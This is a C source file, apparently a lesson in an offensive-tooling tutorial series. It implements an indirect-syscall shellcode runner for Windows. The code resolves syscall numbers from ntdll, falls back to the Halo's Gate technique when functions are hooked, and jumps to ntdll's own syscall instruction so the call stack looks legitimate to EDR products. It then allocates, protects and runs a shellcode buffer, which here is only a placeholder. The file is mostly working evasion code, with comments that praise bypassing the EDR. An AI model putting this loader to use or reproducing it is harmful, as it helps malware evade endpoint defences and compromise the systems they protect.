/*
 * 11_indirect_syscall.c
 * ======================
 * Indirect Syscall - Bypasses hooks AND fools call stack analysis
 *
 * The problem with Direct Syscall: when you execute the "syscall"
 * instruction inside your own binary, the call stack shows:
 *
 *   ntoskrnl.exe  (kernel)
 *   ??? 0x7FF612340000  <-- SUSPICIOUS: YOUR binary's address
 *
 * Modern EDRs do "stack walk" and detect that the syscall came
 * from a region that is NOT ntdll.dll. This is a red flag.
 *
 * Indirect Syscall solves this: instead of executing "syscall" in our
 * code, we JMP to the "syscall" instruction that ALREADY EXISTS inside
 * ntdll.dll. The call stack becomes:
 *
 *   ntoskrnl.exe  (kernel)
 *   ntdll.dll!NtXxx+0x12  <-- LOOKS LEGITIMATE
 *
 * Flow:
 *   1. We prepare the registers (r10 = rcx, eax = SSN)
 *   2. Instead of executing "syscall", we JMP to the address
 *      of the syscall instruction inside ntdll
 *   3. ntdll executes the syscall and returns
 *   4. The EDR sees a normal call stack
 *
 * Compile:
 *   ml64 /c 11_indirect_stub.asm
 *   cl.exe /O2 11_indirect_syscall.c 11_indirect_stub.obj
 */

#include <windows.h>
#include <stdio.h>

/* ---------------------------------------------------------------
 * Structure that stores information about a resolved syscall
 *
 * ssn: System Service Number (the function number in the kernel)
 * syscallInstructionAddress: address INSIDE ntdll.dll where
 *   the byte sequence "0F 05 C3" (syscall + ret) exists.
 *   THIS is the address we'll jump to instead of executing
 *   syscall in our code.
 * --------------------------------------------------------------- */
typedef struct {
    DWORD ssn;
    PVOID syscallInstructionAddress;
} SYSCALL_ENTRY;

/* Global variables that the assembly will use */
SYSCALL_ENTRY g_NtAllocateVirtualMemory = { 0 };
SYSCALL_ENTRY g_NtProtectVirtualMemory = { 0 };
SYSCALL_ENTRY g_NtCreateThreadEx = { 0 };


/* ---------------------------------------------------------------
 * resolveSyscall - Extracts the SSN and finds the "syscall" address
 *
 * When ntdll is NOT hooked, the beginning of each Nt function is:
 *
 *   4C 8B D1          mov r10, rcx
 *   B8 XX XX 00 00    mov eax, <SSN>    <-- we want this number
 *   ...
 *   0F 05             syscall           <-- we want this address
 *   C3                ret
 *
 * When it IS hooked (EDR installed JMP), the first bytes are
 * different (usually E9 xx xx xx xx = relative JMP).
 *
 * This function checks if the function is hooked by verifying if the
 * first bytes match the expected pattern.
 *
 * If not hooked: extracts the SSN directly (bytes 4 and 5).
 * If hooked: we use the Halo's Gate technique -
 *   we scan neighboring functions (+/-1, +/-2, +/-3...) until we find one
 *   that is not hooked, and calculate the SSN by the distance.
 *
 * Parameters:
 *   functionName -> function name (e.g.: "NtAllocateVirtualMemory")
 *   entry        -> pointer to struct where we'll save the SSN and address
 *
 * Returns: TRUE if successfully resolved
 * --------------------------------------------------------------- */
BOOL resolveSyscall(const char* functionName, SYSCALL_ENTRY* entry) {

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    /*
     * Get the function address in ntdll.
     * Even if it's hooked, the base address is the same.
     * The hook modifies the BYTES at this address, not the address itself.
     */
    BYTE* func = (BYTE*)GetProcAddress(hNtdll, functionName);
    if (!func) {
        printf("[!] Function %s not found\n", functionName);
        return FALSE;
    }

    /* ---------------------------------------------------------------
     * Check if the function is hooked
     *
     * Normal pattern (no hook):
     *   Byte 0: 0x4C  (part of "mov r10, rcx")
     *   Byte 1: 0x8B
     *   Byte 2: 0xD1
     *   Byte 3: 0xB8  (part of "mov eax, <SSN>")
     *
     * If byte 0 != 0x4C or byte 3 != 0xB8, it probably has a hook.
     * Common hooks start with:
     *   0xE9 = relative JMP (inline hook)
     *   0xFF 0x25 = absolute JMP via memory
     * --------------------------------------------------------------- */
    if (func[0] == 0x4C && func[1] == 0x8B && func[2] == 0xD1 && func[3] == 0xB8) {
        /*
         * Function is NOT hooked - extract SSN directly
         *
         * Bytes 4 and 5 contain the SSN as a little-endian WORD.
         * Example: B8 18 00 00 00 -> SSN = 0x0018
         *
         * *(WORD*)(func + 4) reads 2 bytes from offset 4
         * and interprets them as a 16-bit number.
         */
        entry->ssn = *(WORD*)(func + 4);
        printf("[+] %s: SSN = 0x%04X (not hooked)\n", functionName, entry->ssn);
    }
    else {
        /*
         * Function IS hooked - use Halo's Gate
         *
         * Idea: Nt functions in ntdll are sequential, and SSNs
         * are sequential. If NtAllocateVirtualMemory has SSN 0x18,
         * the function right below probably has SSN 0x19.
         *
         * We scan neighboring functions (32 bytes apart each)
         * until we find one that is NOT hooked, read its SSN,
         * and adjust by the distance.
         *
         * Example: neighbor +2 has SSN 0x1A and is not hooked.
         *   Our SSN = 0x1A - 2 = 0x18
         */
        printf("[!] %s is HOOKED. Using Halo's Gate...\n", functionName);

        for (int offset = 1; offset < 50; offset++) {
            /* Check neighbor BELOW (func + offset * 32 bytes) */
            BYTE* neighbor = func + (offset * 32);
            if (neighbor[0] == 0x4C && neighbor[1] == 0x8B && neighbor[2] == 0xD1 && neighbor[3] == 0xB8) {
                entry->ssn = *(WORD*)(neighbor + 4) - offset;
                printf("[+] %s: SSN = 0x%04X (calculated via neighbor +%d)\n",
                       functionName, entry->ssn, offset);
                break;
            }
            /* Check neighbor ABOVE (func - offset * 32 bytes) */
            neighbor = func - (offset * 32);
            if (neighbor[0] == 0x4C && neighbor[1] == 0x8B && neighbor[2] == 0xD1 && neighbor[3] == 0xB8) {
                entry->ssn = *(WORD*)(neighbor + 4) + offset;
                printf("[+] %s: SSN = 0x%04X (calculated via neighbor -%d)\n",
                       functionName, entry->ssn, offset);
                break;
            }
        }
    }

    /* ---------------------------------------------------------------
     * Find address of the "syscall; ret" instruction in ntdll
     *
     * We scan bytes from the beginning of the function looking for:
     *   0x0F 0x05 = syscall
     *   0xC3      = ret
     *
     * Even if the function is hooked at the beginning, the "syscall"
     * instruction usually still exists further in the bytes.
     *
     * If not found in this function, we can search in any other
     * Nt function - the syscall address is generic.
     * --------------------------------------------------------------- */
    BOOL found = FALSE;
    for (int i = 0; i < 64; i++) {
        if (func[i] == 0x0F && func[i + 1] == 0x05 && func[i + 2] == 0xC3) {
            entry->syscallInstructionAddress = &func[i];
            found = TRUE;
            break;
        }
    }

    /* If not found in the hooked function, search in NtClose (usually clean) */
    if (!found) {
        BYTE* ntClose = (BYTE*)GetProcAddress(hNtdll, "NtClose");
        for (int i = 0; i < 64; i++) {
            if (ntClose[i] == 0x0F && ntClose[i + 1] == 0x05 && ntClose[i + 2] == 0xC3) {
                entry->syscallInstructionAddress = &ntClose[i];
                found = TRUE;
                break;
            }
        }
    }

    if (found) {
        printf("    Syscall instruction at: 0x%p\n", entry->syscallInstructionAddress);
    }

    return found;
}


/*
 * Declaration of the assembly functions that perform the indirect syscall.
 * Implemented in 11_indirect_stub.asm
 *
 * Each function:
 *   1. mov r10, rcx (prepare first argument)
 *   2. mov eax, [SSN from global struct]
 *   3. jmp [syscallInstructionAddress from global struct]
 *
 * The JMP makes execution continue INSIDE ntdll.dll,
 * at the "syscall" instruction followed by "ret".
 * The call stack shows ntdll as the syscall origin.
 */
EXTERN_C NTSTATUS IndirectNtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect
);

EXTERN_C NTSTATUS IndirectNtProtectVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
    ULONG NewProtect, PULONG OldProtect
);

EXTERN_C NTSTATUS IndirectNtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList
);


int main() {

    printf("[*] Indirect Syscall - Shellcode Runner\n");
    printf("[*] ====================================\n\n");

    /* Resolve SSNs and syscall addresses for each function */
    if (!resolveSyscall("NtAllocateVirtualMemory", &g_NtAllocateVirtualMemory)) return 1;
    if (!resolveSyscall("NtProtectVirtualMemory", &g_NtProtectVirtualMemory)) return 1;
    if (!resolveSyscall("NtCreateThreadEx", &g_NtCreateThreadEx)) return 1;

    printf("\n[*] All syscalls resolved. Executing...\n\n");

    /* Shellcode placeholder */
    unsigned char shellcode[] = { 0x90, 0x90, 0x90, 0x90, 0xCC };
    SIZE_T size = sizeof(shellcode);

    /* STEP 1: Allocate memory via indirect syscall */
    PVOID base = NULL;
    NTSTATUS status = IndirectNtAllocateVirtualMemory(
        GetCurrentProcess(), &base, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    printf("[+] NtAllocateVirtualMemory: 0x%08X -> 0x%p\n", status, base);

    if (status != 0) return 1;

    /* Copy shellcode */
    memcpy(base, shellcode, sizeof(shellcode));

    /* STEP 2: Change to RX via indirect syscall */
    ULONG oldProt = 0;
    status = IndirectNtProtectVirtualMemory(
        GetCurrentProcess(), &base, &size,
        PAGE_EXECUTE_READ, &oldProt
    );
    printf("[+] NtProtectVirtualMemory: 0x%08X\n", status);

    /* STEP 3: Create thread via indirect syscall */
    HANDLE hThread = NULL;
    status = IndirectNtCreateThreadEx(
        &hThread, THREAD_ALL_ACCESS, NULL,
        GetCurrentProcess(), base, NULL,
        0, 0, 0, 0, NULL
    );
    printf("[+] NtCreateThreadEx: 0x%08X\n", status);

    if (hThread) {
        printf("\n[+] Thread created via INDIRECT syscall!\n");
        printf("[*] Call stack points to ntdll.dll - looks legitimate to the EDR\n");
        printf("[*] ntdll hooks were bypassed without being removed\n");
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    return 0;
}
